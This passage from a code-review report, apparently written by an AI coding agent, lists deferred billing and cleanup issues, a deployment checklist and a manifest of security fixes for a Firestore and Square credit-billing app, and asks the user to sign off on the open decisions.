- **Why I didn't fix it:** A clean fix means changing what `/billing/products` returns (to include the rate) and that's an API contract change I didn't want to make without your sign-off, since it touches a payment-adjacent endpoint. Lowest-effort real fix: add `creditsPerDollar: CREDITS_PER_DOLLAR` to the JSON returned by `GET /billing/products` in `billing.ts`, and have `Billing.tsx` read it from there instead of hardcoding it. Happy to do this on your go-ahead.

## B2. Admin credit adjustment has no floor at zero
- **Where:** `artifacts/api-server/src/routes/admin.ts`, `POST /admin/users/:uid/credits` → calls `addCredits(uid, amount, "admin_adjustment", ...)`, which does `newBalance = current + amount` with no clamp.
- **Why it matters:** An admin issuing a large negative adjustment (e.g., clawing back credits from an abusive account) can drive a user's `creditBalance` negative. This might be exactly what you want — e.g., to represent a debt the account owes before it can use the product again — or it might be an oversight that should be clamped to zero.
- **Why I didn't fix it:** This is a product decision, not a bug. Only verified admins (gated by `requireAdmin`, already confirmed solid) can reach this route, so there's no security exposure — just a behavior I want you to confirm is intentional before I either leave it or add a `Math.max(0, ...)` clamp.

## B3. `lib/db` (Drizzle/Postgres) and `lib/api-client-react` are dead, unused scaffolding
- **Where:** `lib/db/` (empty schema — `export {}` — plus a `pool`/`db` export that throws if `DATABASE_URL` isn't set) and `lib/api-client-react/` (a generated React Query client from `openapi.yaml`, which itself only documents a single `/healthz` path).
- **Why it matters:** `api-server/package.json` declares `"@workspace/db": "workspace:*"` as a dependency, but I confirmed via exhaustive grep across the entire repo that **no `.ts` file anywhere imports from it**. Same for `api-client-react` in `gh-brain` — declared, never imported; the frontend hand-writes its own `fetch()` calls in `sessionService.ts`/`authService.ts`/`billingService.ts` instead.
- **Confirmed harmless to the build:** I traced `api-server/build.mjs` — esbuild's entry point is `src/index.ts`, and bundlers only pull in code reachable from actual imports starting there. Since nothing imports `@workspace/db`, esbuild never touches it, so the `throw new Error("DATABASE_URL must be set...")` guard inside it never fires, and the running server won't crash.
- **Why I didn't fix it:** This is cleanup, not a defect — deleting unused packages or leaving them as documented future scaffolding is a judgment call I didn't want to make unilaterally (someone may have started this Postgres path intentionally for a future feature). Worth a decision on your end: delete it, or add a one-line comment in each `package.json` noting it's intentionally unused for now.

---

# SECTION C — Deployment checklist

Apply in this order:

1. ☐ **Set `SQUARE_WEBHOOK_SIGNATURE_KEY`** in production (Fix #3) — do this **before** deploying `squareEventHandler.ts`, or Square purchases will stop granting credits the moment that file deploys.
2. ☐ Deploy: `squareEventHandler.ts`, `brain.ts`, `gemini.ts`, `grok.ts`, `custom.ts`, `Session.tsx`, `Billing.tsx`, `firestoreService.ts`.
3. ☐ Deploy `firestore.rules` via `firebase deploy --only firestore:rules` — test in your sandbox project first if at all possible.
4. ☐ Manually confirm after deploy:
   - A normal Settings save still works.
   - A hand-crafted `creditBalance` write via the client SDK is rejected.
   - A feedback (thumbs up/down) submission succeeds.
   - The auto-refill low-balance redirect-to-Square-then-clear-field flow still works end to end.
   - One real Gemini session and one real Grok session show non-estimated (real) token counts in the resulting session record.
   - Exporting a session to PDF with a deliberately weird question (try literally typing `<b>test</b>` as part of a question) renders the PDF showing the literal text `<b>test</b>`, not bold text — confirms escaping is active.
   - The auto-refill toggle on the Billing page shows the *correct* state after a hard page reload, matching what was last saved.

---

# SECTION D — File manifest

| File | Fix # | What changed |
|---|---|---|
| `firestore.rules` | 1 | Full rewrite — field-level protection on `users`, fixed `isPublic`→`shared`, added `feedback` rule |
| `artifacts/gh-brain/src/pages/app/Session.tsx` | 2 | Added `esc()` helper, applied to every interpolated value in `exportPDF` |
| `artifacts/api-server/src/lib/squareEventHandler.ts` | 3 | Fail-closed signature check, buffer-length guard, credit-amount sanity cap |
| `artifacts/api-server/src/routes/brain.ts` | 4 | Server-side sessionId generation before credit reservation |
| `artifacts/api-server/src/lib/providers/gemini.ts` | 5 | Added `getLastUsage()` + `stream_options.include_usage` |
| `artifacts/api-server/src/lib/providers/grok.ts` | 5 | Same as above |
| `artifacts/api-server/src/lib/providers/custom.ts` | 5 | Same as above, with fallback retry |
| `artifacts/gh-brain/src/pages/app/Billing.tsx` | 6 | Added `useEffect` to sync auto-refill toggle from saved preference |
| `artifacts/gh-brain/src/services/firestoreService.ts` | 6 | Added `autoRefill` / `autoRefillCheckoutUrl` to `UserProfile` type |

No new files. No dependency changes. No API contract changes (Section B1's suggested fix would be the one exception, pending your go-ahead).
